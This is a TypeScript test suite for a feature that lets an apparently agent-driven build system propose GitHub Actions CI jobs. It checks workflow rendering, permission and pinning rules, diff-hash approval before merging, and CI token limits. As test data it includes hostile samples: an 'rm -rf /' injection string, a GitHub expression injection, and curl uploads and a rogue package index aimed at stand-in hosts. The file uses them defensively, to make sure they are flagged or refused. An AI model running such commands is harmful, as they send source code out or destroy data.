import * as fs from "node:fs";
import * as path from "node:path";
import YAML from "yaml";
import { describe, expect, it } from "vitest";
import type { CheckRun, Pull, RequiredCheck } from "../src/build/pulls";
import { type ChangedFile, diffHash } from "../src/inbox/auto-merge";
import type { IssueComment } from "../src/inbox/github-issues";
import { ciHold, ciOnlyCovered, type CiItem } from "../src/ci/hold";
import { changeRecord, ciChange, ciJobsItem, filesDiff } from "../src/ci/item";
import { type MainView, blobSha, commandFlags, impostorChecks, planJobs, prFiles, renderedProblems } from "../src/ci/plan";
import { type CiChangeApi, ciBranch, ciTokenName, ciTokenProblems, daysLeft, landCiChange } from "../src/ci/push";
import { parseRequest } from "../src/ci/request";
import { checkName, readHeader, renderWorkflow, shellQuote, workflowPath } from "../src/ci/render";
import { CI_JOBS_HOW, buildTurn } from "../src/build/worker";
import { configChangesCheck, failedConfigChecks, specCiJobs } from "../src/readiness/checks";
import { modelReport } from "../src/schemas/agent-report";
import { isSecretName } from "../src/secrets";
import { FIXTURES } from "../scripts/render-ci-templates";

// F-026: the factory proposes CI jobs.

const SHA = "a".repeat(40);
const py = { language: "python", version: "3.12" };
const contract = { repo: "mesbot", job: "contract", action: "add", template: "test-command", params: { runtime: py, setup: [["pip", "install", "-r", "requirements-dev.txt"]], run: ["python", "-m", "pytest", "-m", "contract"] }, covers: ["tests/test_deploy.py", "AC-3"], reason: "Contract tests need Linux." };
const EMPTY: MainView = { workflows: [], checks: [], required: [] };

function rendered(raw: unknown): { path: string; content: string } {
  const q = parseRequest(raw);
  if (!q.ok || q.request.action === "remove") throw new Error(q.ok ? "remove" : q.error);
  return renderWorkflow(q.request);
}

describe("F-026 requests and templates (FR-1 to FR-3)", () => {
  it("AC-1: a valid request renders factory-<job>.yml with the engine's header and the job's check name", () => {
    const out = rendered(contract);
    expect(out.path).toBe(".github/workflows/factory-contract.yml");
    expect(readHeader(out.content)).toEqual({ template: "test-command", catalog: 1, job: "contract" });
    const doc = YAML.parse(out.content) as { jobs: Record<string, { name: string; steps: Array<{ run?: string }> }> };
    expect(doc.jobs["factory-contract"]!.name).toBe(checkName("contract"));
    expect(doc.jobs["factory-contract"]!.steps.map((s) => s.run).filter(Boolean)).toEqual(["pip install -r requirements-dev.txt", "python -m pytest -m contract"]);
  });

  it("AC-2: an unknown template, params that fail its schema, or a remove with params is refused with the reason", () => {
    expect(parseRequest({ ...contract, template: "docker-build" })).toMatchObject({ ok: false });
    const bad = parseRequest({ ...contract, params: { runtime: py } });
    expect(bad.ok).toBe(false);
    expect(!bad.ok && bad.error).toMatch(/params for test-command: run/);
    expect(parseRequest({ ...contract, action: "remove" })).toMatchObject({ ok: false, error: "a remove request takes no template or params" });
    expect(parseRequest({ ...contract, params: { ...contract.params, extra: 1 } }).ok).toBe(false);
  });

  it("AC-3: a path with .. or an absolute path is refused", () => {
    const cov = { ...contract, job: "cov", template: "coverage", params: { ...contract.params, report: "../out/coverage.xml", min_percent: 80 } };
    expect(parseRequest(cov).ok).toBe(false);
    expect(parseRequest({ ...cov, params: { ...cov.params, report: "/tmp/coverage.xml" } }).ok).toBe(false);
    expect(parseRequest({ ...cov, params: { ...cov.params, report: "reports/coverage.xml" } }).ok).toBe(true);
    expect(parseRequest({ ...contract, template: "semgrep", params: { configs: ["rules/../../x.yml"] } }).ok).toBe(false);
  });

  it("FR-3: an argument can't carry a GitHub expression or a new line, and is single-quoted for the shell", () => {
    expect(parseRequest({ ...contract, params: { ...contract.params, run: ["echo", "${{ github.event.issue.title }}"] } }).ok).toBe(false);
    expect(parseRequest({ ...contract, params: { ...contract.params, run: ["echo", "a\nb"] } }).ok).toBe(false);
    expect(shellQuote("it's; rm -rf /")).toBe(`'it'"'"'s; rm -rf /'`);
    expect(shellQuote("--cov=pkg")).toBe("--cov=pkg");
    expect(parseRequest({ ...contract, job: "Contract" }).ok).toBe(false);
  });

  it("AC-12: only the test engineer's report may carry ci_jobs", () => {
    const report = (role: string, body: Record<string, unknown>) => ({ schema: "agent-report/1.0", role, feature: "F-005", stage: "build", commit: SHA, outcome: "complete", summary: "ok", body });
    expect(modelReport("test-engineer").safeParse(report("test-engineer", { criteria_map: {}, tool_choices: [], ci_jobs: [contract] })).success).toBe(true);
    expect(modelReport("software-developer").safeParse(report("software-developer", { files_changed: [], spec_deviations: [], not_done: [], docs_updated: [], ci_jobs: [contract] })).success).toBe(false);
  });

  it("FR-1: the test engineer is told how to ask for a job and that it can't write .github/", () => {
    const facts = { feature: "F-005", title: "t", repo: "mesbot", branch: "b", worktree: "/w", spec: "s", folder: "f", version: 1, commit: SHA, stage: "build" };
    expect(buildTurn("test-engineer", facts)).toContain(CI_JOBS_HOW);
    expect(buildTurn("software-developer", facts)).not.toContain("`ci_jobs`");
    expect(CI_JOBS_HOW).toMatch(/can't write `.github\/`/);
  });
});

describe("F-026 rendered workflows (FR-4, SR-1, SR-7, AC-4)", () => {
  it("AC-4: every fixture renders with only the allowed triggers, read-only permissions, no secrets, pinned actions, no kept credentials and no cache", () => {
    for (const raw of FIXTURES) {
      const out = rendered(raw);
      expect(renderedProblems(out.path, out.content), out.path).toEqual([]);
      const doc = YAML.parse(out.content) as Record<string, unknown>;
      expect(Object.keys(doc.on as object).every((t) => ["pull_request", "push", "workflow_dispatch", "schedule"].includes(t))).toBe(true);
      expect(doc.permissions).toEqual({ contents: "read" });
      expect(out.content).not.toMatch(/secrets\.|pull_request_target|cache:/);
    }
  });

  it("FR-4: the rule check catches a workflow that breaks a rule, whatever made it", () => {
    const out = rendered(contract);
    expect(renderedProblems(out.path, out.content.replace("contents: read", "contents: write"))).toContain(`${out.path} asks for more than contents: read`);
    expect(renderedProblems(out.path, out.content.replace("workflow_dispatch: {}", "pull_request_target: {}")).join(" ")).toMatch(/pull_request_target/);
    expect(renderedProblems(out.path, out.content.replace(/checkout@[0-9a-f]{40}/, "checkout@v4")).join(" ")).toMatch(/isn't pinned/);
    expect(renderedProblems(out.path, out.content.replace("persist-credentials: false", "persist-credentials: true")).join(" ")).toMatch(/credentials kept/);
    expect(renderedProblems(out.path, out.content.replace("    timeout-minutes: 30\n", "")).join(" ")).toMatch(/no timeout/);
  });

  it("SR-12: a schedule is opt-in for tests and shown with its timeout", () => {
    const fuzz = rendered({ ...contract, job: "fuzz", params: { ...contract.params, schedule: true, timeout_minutes: 90 } });
    expect((YAML.parse(fuzz.content) as { on: { schedule?: unknown } }).on.schedule).toBeDefined();
    expect((YAML.parse(rendered(contract).content) as { on: { schedule?: unknown } }).on.schedule).toBeUndefined();
  });
});

describe("F-026 planning against main (FR-5, FR-6, SR-6, SR-8)", () => {
  it("AC-5: update of a workflow the engine didn't render is refused; add of an existing factory job asks for update", () => {
    const hand: MainView = { ...EMPTY, workflows: [{ path: workflowPath("contract"), text: "name: x\non: push\njobs: {}\n" }] };
    expect(planJobs([{ ...contract, action: "update" }], "mesbot", hand).refused[0]!.why).toMatch(/wasn't rendered by the engine/);
    const mine: MainView = { ...EMPTY, workflows: [rendered(contract)].map((w) => ({ path: w.path, text: w.content })) };
    expect(planJobs([contract], "mesbot", mine).refused[0]!.why).toMatch(/ask for update/);
    expect(planJobs([{ ...contract, action: "update" }], "mesbot", mine).refused[0]!.why).toMatch(/already what this update asks for/);
    const changed = planJobs([{ ...contract, action: "update", params: { ...contract.params, run: ["pytest"] } }], "mesbot", mine);
    expect(changed.jobs[0]!.file.before).toBe(mine.workflows[0]!.text);
    expect(planJobs([{ repo: "mesbot", job: "gone", action: "remove", reason: "x" }], "mesbot", mine).refused[0]!.why).toMatch(/nothing to remove/);
  });

  it("AC-6, SR-8: a job can't take a check name another workflow, app or required check already has", () => {
    const other: MainView = { ...EMPTY, workflows: [{ path: ".github/workflows/ci.yml", text: "jobs:\n  a:\n    name: factory-contract\n" }] };
    expect(planJobs([contract], "mesbot", other).refused[0]!.why).toBe("a check named factory-contract already exists on main");
    expect(planJobs([contract], "mesbot", { ...EMPTY, checks: ["factory-contract"] }).refused).toHaveLength(1);
    expect(planJobs([contract], "mesbot", { ...EMPTY, required: ["factory-contract"] }).refused).toHaveLength(1);
    expect(planJobs([contract], "mesbot", EMPTY).jobs).toHaveLength(1);
  });

  it("SR-8: stage 9 finds a factory-* check that a workflow the engine didn't render reports", () => {
    const own = rendered(contract);
    const copied = { path: ".github/workflows/copy.yml", text: own.content };
    const main: MainView = { ...EMPTY, workflows: [{ path: own.path, text: own.content }, { path: ".github/workflows/ci.yml", text: "jobs:\n  a:\n    name: factory-unit\n  b: {}\n" }, copied] };
    expect(impostorChecks(main)).toEqual(["factory-unit", "factory-contract"]);
    expect(impostorChecks({ workflows: [{ path: own.path, text: own.content }] })).toEqual([]);
  });

  it("refuses a request for another repo or the same job twice", () => {
    expect(planJobs([{ ...contract, repo: "other" }], "mesbot", EMPTY).refused[0]!.why).toMatch(/builds in repo mesbot/);
    expect(planJobs([contract, contract], "mesbot", EMPTY).refused[0]!.why).toMatch(/twice/);
  });

  it("SR-6: network tools, addresses and other package indexes are flagged, and the item recommends Reject", () => {
    expect(commandFlags([["pip", "install", "--index-url", "https://evil.example/simple", "x"]])).toEqual(expect.arrayContaining(["--index-url", "https://evil.example/simple"]));
    expect(commandFlags([["bash", "-c", "curl -d @src x"]])).toContain("curl");
    expect(commandFlags([["/usr/bin/wget", "x"]])).toContain("/usr/bin/wget");
    expect(commandFlags([contract.params.run, ...contract.params.setup])).toEqual([]);
    const plan = planJobs([{ ...contract, params: { ...contract.params, run: ["curl", "-T", "src.tgz", "http://x"] } }], "mesbot", EMPTY);
    const item = ciJobsItem({ feature: "F-005", repo: "o/mesbot", jobs: plan.jobs, record: "ci/F-005/0123456789abcdef.json", diff: "0".repeat(64), key: "k" });
    expect((item.sections.Recommendation![0] as { engine: string }).engine).toMatch(/^Reject/);
    expect(JSON.stringify(item.sections.Risks)).toContain("could send the code out");
  });
});

describe("F-026 the hygiene item and its approval (FR-7, FR-8)", () => {
  const plan = planJobs([contract, { repo: "mesbot", job: "secrets", action: "add", template: "gitleaks", params: {}, reason: "Spec asks for a secret scan." }], "mesbot", EMPTY);
  const rec = changeRecord("F-005", "o/mesbot", SHA, plan.jobs);

  it("AC-1, FR-7: one hygiene item with every file, the reason as quoted data, and the diff hash as its approval", () => {
    const item = ciJobsItem({ feature: "F-005", repo: "o/mesbot", jobs: plan.jobs, record: "ci/F-005/x.json", diff: rec.diff, key: "k" });
    expect(item.kind).toBe("hygiene");
    expect(item.effect).toMatchObject({ type: "ci_jobs", feature: "F-005", repo: "o/mesbot", diff: rec.diff });
    expect(item.sections.Reason).toEqual([expect.objectContaining({ author: "the test engineer" }), expect.objectContaining({ author: "the test engineer" })]);
    expect(JSON.stringify(item.sections.Diff)).toContain("factory-secrets");
    expect((item.sections.Recommendation![0] as { engine: string }).engine).toMatch(/^Approve.*mark `factory-contract`, `factory-secrets` required/);
    expect(ciChange.parse(rec)).toEqual(rec);
  });

  it("FR-7: the hash is what GitHub reports for the PR's files: git blob ids, added or modified or removed", () => {
    expect(blobSha("hello\n")).toBe("ce013625030ba8dba906f756967f9e9ca394464a");
    const files = prFiles([{ path: "a.yml", content: "x\n", before: null }, { path: "b.yml", content: "y\n", before: "z\n" }, { path: "c.yml", content: null, before: "w\n" }]);
    expect(files.map((f) => f.status)).toEqual(["added", "modified", "removed"]);
    expect(filesDiff(rec.files)).toBe(rec.diff);
  });

  class Api implements CiChangeApi {
    pushed: Array<{ branch: string; files: unknown }> = [];
    merged: number[] = [];
    posted: string[] = [];
    pr: Pull | null = null;
    filesOnPr: ChangedFile[] = prFiles(rec.files);
    green = true;
    adminOk = false;
    workflowOk = true;
    expiry: Date | null = new Date(Date.now() + 20 * 86_400_000);
    async tokenExpiry() { return this.expiry; }
    async mainHead() { return SHA; }
    async pushFiles(_r: string, _b: string, branch: string, files: unknown) { this.pushed.push({ branch, files }); return "b".repeat(40); }
    async adminRefused() { return !this.adminOk; }
    async workflowWriteAllowed() { return this.workflowOk; }
    async reachableRepos() { return [{ name: "o/mesbot", private: true }, { name: "o/public", private: false }]; }
    async findPull() { return this.pr; }
    async createPull(_r: string, p: { head: string }) { this.pr = { number: 9, nodeId: "n", state: "open", draft: true, merged: false, mergeCommit: null, mergedBy: "", head: { sha: "b".repeat(40), ref: p.head, repo: "o/mesbot" }, url: "" }; return this.pr; }
    async markReady() { this.pr = { ...this.pr!, draft: false }; }
    async pull() { return this.pr!; }
    async files() { return this.filesOnPr; }
    async requiredChecks(): Promise<RequiredCheck[]> { return [{ context: "ci", integrationId: null }]; }
    async checkRuns(): Promise<CheckRun[]> { return [{ name: "ci", status: this.green ? "completed" : "in_progress", conclusion: this.green ? "success" : null, appId: 15368, headSha: "b".repeat(40), summary: "" }]; }
    async merge(_r: string, n: number) { this.merged.push(n); return true; }
    async comment(_r: string, _n: number, body: string) { this.posted.push(body); return 1; }
    async updatePull() {}
    async closePull() {}
    async comments(): Promise<IssueComment[]> { return []; }
  }

  it("FR-8: an approved change is pushed on hygiene/<item>, opened, marked ready and merged once green", async () => {
    const api = new Api();
    api.green = false;
    const first = await landCiChange(api, { itemId: "H-0400", change: rec, approvedDiff: rec.diff, title: "CI", body: "b" });
    expect(first).toMatchObject({ state: "waiting", pr: 9 });
    expect(api.pushed).toEqual([{ branch: ciBranch("H-0400"), files: rec.files }]);
    api.green = true;
    expect(await landCiChange(api, { itemId: "H-0400", change: rec, approvedDiff: rec.diff, title: "CI", body: "b" })).toMatchObject({ state: "merged", pr: 9 });
    expect(api.pushed).toHaveLength(1);
    expect(api.merged).toEqual([9]);
  });

  it("AC-7: when the PR's files differ from the approved diff, nothing is merged and the PR says so", async () => {
    const api = new Api();
    api.filesOnPr = [{ filename: ".github/workflows/factory-contract.yml", status: "added", sha: "c".repeat(40) }];
    expect(await landCiChange(api, { itemId: "H-0400", change: rec, approvedDiff: rec.diff, title: "CI", body: "b" })).toMatchObject({ state: "refused" });
    expect(api.merged).toEqual([]);
    expect(api.posted[0]).toContain("differ from the ones approved in H-0400");
  });

  it("FR-7: a change record that no longer hashes to the approval lands nothing", async () => {
    const api = new Api();
    const tampered = { ...rec, files: rec.files.map((f, i) => (i === 0 ? { ...f, content: `${f.content}# more\n` } : f)) };
    expect(await landCiChange(api, { itemId: "H-0400", change: tampered, approvedDiff: rec.diff, title: "CI", body: "b" })).toMatchObject({ state: "refused" });
    expect(api.pushed).toEqual([]);
  });

  it("AC-8, SR-3, SR-9: the CI token is checked: fine-grained, no outside private repo, no Administration, workflow write works", async () => {
    const api = new Api();
    expect(await ciTokenProblems(api, ["o/mesbot"], "o/mesbot", "github_pat_x")).toEqual([]);
    api.workflowOk = false;
    api.adminOk = true;
    const problems = await ciTokenProblems(api, ["o/other"], "o/mesbot", "ghp_classic");
    expect(problems.join(" | ")).toMatch(/isn't a fine-grained token.*outside the project.*Administration access.*can't write workflow files/);
  });

  it("SR-3, SR-5: the CI token must expire, in 30 days or less", async () => {
    const api = new Api();
    const now = new Date("2026-11-28T00:00:00Z");
    api.expiry = new Date("2026-12-29T00:00:00Z");
    expect(await ciTokenProblems(api, ["o/mesbot"], "o/mesbot", "github_pat_x", now)).toEqual([]);
    api.expiry = new Date("2027-02-26T00:00:00Z");
    expect((await ciTokenProblems(api, ["o/mesbot"], "o/mesbot", "github_pat_x", now)).join()).toContain("expires in 90 days; give it 30 days or less");
    api.expiry = null;
    expect((await ciTokenProblems(api, ["o/mesbot"], "o/mesbot", "github_pat_x", now)).join()).toContain("never expires");
    expect(daysLeft(new Date("2026-12-03T12:00:00Z"), now)).toBe(5);
  });

  it("SR-2: the CI token is read in src/ci/push.ts only", () => {
    const src = path.join(__dirname, "..", "src");
    const hits: string[] = [];
    const walk = (dir: string) => {
      for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
        const p = path.join(dir, e.name);
        if (e.isDirectory()) walk(p);
        else if (/\.tsx?$/.test(e.name) && /ciTokenName\(|`ci-token\//.test(fs.readFileSync(p, "utf8"))) hits.push(path.relative(src, p).replace(/\\/g, "/"));
      }
    };
    walk(src);
    expect(hits).toEqual(["ci/push.ts"]);
    expect(ciTokenName("mesbot", "Technophile77")).toBe("ci-token/mesbot/technophile77");
    expect(isSecretName("ci-token/mesbot/technophile77")).toBe(true);
  });
});

describe("F-026 the pull request waits for its CI jobs (FR-9 to FR-11, SR-10, OQ-3)", () => {
  const rec = changeRecord("F-005", "o/mesbot", SHA, planJobs([contract], "mesbot", EMPTY).jobs);
  const ciOnly = [{ test: "tests/test_deploy.py" }];
  const item = (status: string, merged = false): CiItem => ({ id: "H-0400", status, change: rec, merged });
  const base = { ciOnly, required: [], specJobs: [], mainJobs: [] };

  it("AC-9: an open item, or an approved one not merged yet, keeps the PR waiting; approved ones are landed", () => {
    expect(ciHold({ ...base, items: [item("open")] })).toMatchObject({ kind: "wait", land: [] });
    expect(ciHold({ ...base, items: [item("approved")] })).toMatchObject({ kind: "wait", land: ["H-0400"] });
  });

  it("OQ-3 A: once merged, a job that runs CI-only tests counts only when the owner made its check required", () => {
    expect(ciHold({ ...base, items: [item("approved", true)] })).toEqual({ kind: "mark_required", why: expect.stringContaining("factory-contract"), checks: ["factory-contract"] });
    expect(ciHold({ ...base, required: ["factory-contract"], items: [item("approved", true)] })).toEqual({ kind: "none" });
    expect(ciHold({ ...base, ciOnly: [], items: [item("approved", true)] })).toEqual({ kind: "none" });
  });

  it("AC-10: a rejected item that leaves CI-only tests with no job puts the feature to the owner; a withdrawn one doesn't", () => {
    expect(ciHold({ ...base, items: [item("rejected")] })).toMatchObject({ kind: "stuck", why: expect.stringContaining("tests/test_deploy.py") });
    expect(ciHold({ ...base, items: [item("closed")] })).toEqual({ kind: "none" });
    expect(ciHold({ ...base, required: ["factory-contract"], items: [item("rejected"), { ...item("approved", true), id: "H-0401" }] })).toEqual({ kind: "none" });
  });

  it("AC-11: a spec's CI job row doesn't fail the readiness gate, and stage 9 waits until that job is on main", () => {
    const spec = [
      "## 7. Dependencies", "", "### Configuration changes needed before implementation", "",
      "| Id | Change | Check | Status |", "|---|---|---|---|",
      "| C-1 | Contract tests in CI | ci job mesbot/contract | Pending |",
      "| C-2 | Developer may write deploy.sh | software-developer may write deploy.sh | Applied |", "",
      "## 8. Assumptions",
    ].join("\n");
    expect(configChangesCheck(spec).passed).toBe(true);
    expect(failedConfigChecks(spec, () => ({ allow: ["deploy.sh"], deny: [] }) as never)).toEqual([]);
    expect(specCiJobs(spec, "mesbot")).toEqual(["contract"]);
    expect(ciHold({ ...base, ciOnly: [], specJobs: ["contract"], items: [] })).toMatchObject({ kind: "stuck" });
    expect(ciHold({ ...base, ciOnly: [], specJobs: ["contract"], mainJobs: ["contract"], items: [] })).toEqual({ kind: "none" });
  });

  it("SR-10: CI-only tests stay pending while a live request covers every one of them", () => {
    expect(ciOnlyCovered([item("open")], ciOnly)).toBe(true);
    expect(ciOnlyCovered([item("rejected")], ciOnly)).toBe(false);
    expect(ciOnlyCovered([item("open")], [...ciOnly, { test: "tests/other.py" }])).toBe(false);
  });
});

describe("F-026 diff hash matches the hygiene auto-merge's", () => {
  it("diffHash over prFiles is what autoMergeHygiene compares", () => {
    const files = [{ path: ".github/workflows/factory-x.yml", content: "a\n", before: null }];
    expect(filesDiff(files)).toBe(diffHash([{ filename: ".github/workflows/factory-x.yml", status: "added", sha: blobSha("a\n") }]));
  });
});
